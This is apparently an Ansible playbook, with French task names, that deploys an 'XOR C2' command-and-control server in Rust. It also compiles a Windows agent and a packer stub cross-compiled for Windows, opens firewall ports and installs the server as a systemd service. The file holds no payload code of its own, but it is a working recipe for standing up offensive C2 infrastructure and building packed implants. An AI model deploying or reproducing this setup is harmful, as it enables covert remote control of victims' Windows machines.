---
- name: Déploiement XOR C2 - Serveur Rust
  hosts: vm-deploy
  become: true
  gather_facts: false
  vars:
      project_dir: /opt/xor-c2
      server_user: c2admin
      server_port: 8088
      link: http://98.84.11.231

  tasks:
      - name: Mise à jour des paquets
        ansible.builtin.apt:
            update_cache: yes
            cache_valid_time: 3600

      - name: Installation des dépendances Rust
        apt:
            name:
                - curl
                - build-essential
                - pkg-config
                - libssl-dev
                - sqlite3
                - libsqlite3-dev
            state: present

      - name: Installation de Rust
        shell: |
            curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
        args:
            creates: "{{ project_dir }}/.cargo/bin/rustc"

      - name: Création de l'utilisateur c2admin
        user:
            name: "{{ server_user }}"
            system: yes
            shell: /bin/false
            create_home: no

      - name: Create project directory
        file:
            path: "{{ project_dir }}"
            state: directory
            mode: "0755"
        tags: project

      - name: Copie des sources du serveur
        synchronize:
            src: ../xor-c2-server/
            dest: "{{ project_dir }}/xor-c2-server"
            rsync_opts:
                - "--exclude=target"
        tags: server

      - name: Copie agent windows
        synchronize:
            src: ../agent/
            dest: "{{ project_dir }}/agent"
            rsync_opts:
                - "--exclude=target"
        tags: agent

      - name: Copie Packer
        synchronize:
            src: ../packer/
            dest: "{{ project_dir }}/packer"
            rsync_opts:
                - "--exclude=target"
        tags: packer

      - name: Compilation du serveur
        shell: |
            source $HOME/.cargo/env
            cd {{ project_dir }}/xor-c2-server
            cargo build --release
        args:
            executable: /bin/bash
        tags: compile

      - name: Installation target Windows Rust
        shell: |
            source $HOME/.cargo/env
            rustup target add x86_64-pc-windows-gnu
        args:
            executable: /bin/bash
        tags: compile

      - name: Compilation du packer
        shell: |
            source $HOME/.cargo/env
            cd {{ project_dir }}/packer
            cargo build --release -p packer-cli
            cargo build -p stub --release --target x86_64-pc-windows-gnu
        args:
            executable: /bin/bash
        tags: compile

      - name: Corrige les permissions du répertoire
        ansible.builtin.file:
            path: "{{ project_dir }}"
            owner: "{{ server_user }}"
            group: "{{ server_user }}"
            mode: "0755"
        tags: law

      - name: Ouvrir ports nécessaires
        ufw:
            rule: allow
            port: "{{ item }}"
            proto: tcp
        loop:
            - 22
            - 80
            - 443
            - 8443
            - 8088

      - name: Enable firewall
        ufw:
            state: enabled

      - name: Affichage du résultat de compilation
        debug:
            msg: "Compilation terminée avec succès"

      - name: Création du service systemd
        copy:
            dest: /etc/systemd/system/xor-c2-server.service
            mode: "0644"
            content: |
                [Unit]
                Description=XOR C2 Server
                After=network.target

                [Service]
                Type=simple
                User={{ server_user }}
                WorkingDirectory={{ project_dir }}/xor-c2-server
                Environment=RUST_LOG=info
                ExecStart={{ project_dir }}/xor-c2-server/target/release/xor-c2-server
                Restart=on-failure
                RestartSec=10

                AmbientCapabilities=CAP_NET_BIND_SERVICE
                CapabilityBoundingSet=CAP_NET_BIND_SERVICE
                NoNewPrivileges=true

                [Install]
                WantedBy=multi-user.target

      - name: Activation et démarrage du service
        systemd:
            name: xor-c2-server
            enabled: yes
            state: started
            daemon_reload: yes
